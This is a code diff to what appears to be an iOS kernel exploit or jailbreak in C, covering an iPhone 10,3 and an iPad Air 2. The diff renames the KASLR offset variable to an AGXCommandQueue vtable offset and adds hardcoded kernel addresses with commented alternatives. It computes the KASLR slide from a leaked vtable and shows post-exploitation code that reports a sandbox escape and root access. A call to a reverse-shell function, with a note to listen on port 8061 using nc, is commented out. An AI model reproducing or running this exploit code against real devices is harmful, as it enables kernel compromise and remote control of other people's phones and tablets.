@@ -41,7 +41,7 @@
 #define MAX_PEEKS 30000
 
 uint64_t kernel_proc_offset;
-uint64_t kaslr_offset;
+uint64_t AGXCommandQueue_vtable_offset;
 
 void reverse_shell()
 {
@@ -164,8 +164,8 @@ void post_exploitation(uint64_t kernel_base, uint64_t kaslr_shift)
     
     printf("If all went well, sandbox escaped and root achieved now, test it if you want\n");
     
-    printf("Connect back, make sure you was nc -l 8061");
-    reverse_shell();
+//    printf("Connect back, make sure you was nc -l 8061");
+//    reverse_shell();
     
     printf("Web Server running on port 80\n");
     wsmain(0);
@@ -181,14 +181,18 @@ void jb_go(void)
     if(strncmp(kvers.machine, "iPhone10,3", sizeof("iPhone10,3")) == 0)
     {
         kernel_proc_offset = 0xfffffff0076450a8;
-        kaslr_offset = 0xfffffff006fdd978;
+        AGXCommandQueue_vtable_offset = 0xfffffff006fdd978;
     }
     
     //iPad Air 2 (WiFi)
     if(strncmp(kvers.machine, "iPad5,3", sizeof("iPad5,3")) == 0)
     {
-        kernel_proc_offset = 0xfffffff0075dd0a0;
-        kaslr_offset = 0xfffffff006fd9dd0;
+        kernel_proc_offset = 0xfffffff0075dd0a0; //kernelcache.release.ipad5
+//        kernel_proc_offset = 0xfffffff0075dd0a0; //kernelcache.release.ipad5b
+//        kernel_proc_offset = 0xfffffff0075d10a0; //kernelcache.release.ipad4bm
+        AGXCommandQueue_vtable_offset = /*0xfffffff006f7d798;*/ 0xFFFFFFF006F82E60; /*0xFFFFFFF006F7CE98;*/ /*0xFFFFFFF006F7D5A8;*/ /*kernelcache.release.ipad5*/
+//        AGXCommandQueue_vtable_offset = 0xfffffff006f7ab4; //kernelcache.release.ipad5b
+//        AGXCommandQueue_vtable_offset = 0xfffffff0062efc61; //kernelcache.release.ipad4bm
     }
     
     io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
@@ -283,7 +287,7 @@ void jb_go(void)
     recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
     
     uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
-    uint64_t kaslr_shift = vtable - kaslr_offset;
+    uint64_t kaslr_shift = vtable - AGXCommandQueue_vtable_offset;
     printf("AGXCommandQueue vtable: %p\n", (void *)vtable);
     printf("kaslr shift: %p\n", (void *)kaslr_shift);
     
